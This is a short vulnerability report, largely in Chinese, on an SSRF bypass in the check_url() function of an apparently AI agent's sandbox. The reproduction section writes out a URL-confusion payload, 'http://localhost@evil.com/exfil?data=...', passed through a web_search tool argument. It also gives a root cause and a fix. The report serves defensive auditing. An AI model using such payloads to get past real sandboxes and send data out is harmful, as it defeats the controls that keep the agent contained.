# VULN-008 check_url() URL 解析混淆导致 SSRF

Severity: CRITICAL
Component: `lattice-agent/src/sandbox.rs`
Affected logic: `sandbox.rs:162`

## Summary

check_url() 使用 starts_with("http://localhost") 验证 URL。攻击者传入 "http://localhost@evil.com/exfil"，根据 RFC 3986，localhost 被解析为用户名而非主机，实际请求发送到 evil.com。

## Impact

CRITICAL: SSRF 沙箱完全绕过，可向任意外部主机发送请求

## Reproduction

web_search 工具传入 url: "http://localhost@evil.com/exfil?data=..."

## Root Cause (5-Why)

字符串前缀匹配代替 URL 解析。正确方法应该用 url crate 解析 host 组件再检查。

## Recommended Fix

使用 url::Url::parse() 获取 host 组件，对 host 而非原始字符串做检查。
